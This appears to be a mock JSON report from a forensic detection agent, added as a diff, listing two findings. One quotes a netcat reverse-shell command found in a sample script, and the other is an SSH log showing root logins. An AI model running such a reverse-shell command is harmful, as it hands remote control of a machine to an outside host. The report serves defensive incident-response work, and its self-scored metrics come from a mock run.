@@ -1,0 +1,31 @@
+{
+  "case_id": "FINDEVIL-2026-001",
+  "agent": "FindEvil Protocol SIFT Agent v1.0",
+  "mode": "MOCK",
+  "protocol_sift": true,
+  "timestamp": "2026-05-27T12:52:50.856173",
+  "total_findings": 2,
+  "corrections_made": 2,
+  "hallucinations_caught": 0,
+  "success_rate": "100%",
+  "findings": [
+    {
+      "phase": 3,
+      "type": "ioc_detection",
+      "tool": "grep/yara",
+      "result": "/home/macbere/findevil/evidence/sample/suspicious.sh:nc -e /bin/bash 192.168.1.100 4444\n/home/macbere/findevil/evidence/sample/ioc_list.txt:IP: 192.168.1.100",
+      "severity": "CRITICAL",
+      "corrections": 2,
+      "traceable": true
+    },
+    {
+      "phase": 4,
+      "type": "auth_log",
+      "tool": "log_parser",
+      "result": "May 26 03:14 sshd: Failed password for root from 10.0.0.5\nMay 26 03:15 sshd: Accepted password for root from 10.0.0.5",
+      "severity": "HIGH",
+      "corrections": 2,
+      "traceable": true
+    }
+  ]
+}
